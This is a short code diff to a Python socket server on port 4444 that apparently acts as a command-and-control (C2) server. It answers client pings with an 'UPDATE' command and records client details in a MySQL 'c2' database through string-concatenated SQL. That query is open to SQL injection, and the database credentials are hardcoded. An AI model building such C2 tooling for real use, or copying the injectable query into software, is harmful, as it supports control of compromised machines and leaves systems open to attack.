@@ -2,6 +2,7 @@
 
 import os.path
 import socket
+import mysql.connector
 
 SERVER_IP = "localhost"
 SERVER_PORT = 4444
@@ -37,7 +38,17 @@ while True:
             data = conn.recv(BUFFER_SIZE).decode()
             if not data:
                 break
-            print(data)
+            print("DATA: " + data)
             if data == "PING":
                 command = "UPDATE"
                 conn.sendall(command.encode())
+            else: 
+                vals = data.split("\r\n")
+                cnx = mysql.connector.connect(user='loud', password='loud',
+                              host='127.0.0.1',
+                              database='c2')
+                cursor = cnx.cursor()
+                cursor.execute("REPLACE INTO clients VALUES (\"" + vals[1] + "\",\"" + addr[0] + "\",\"" + vals[2] + "\",\"" + vals[3] + "\");")
+                cnx.commit();
+                cursor.close();
+                cnx.close()
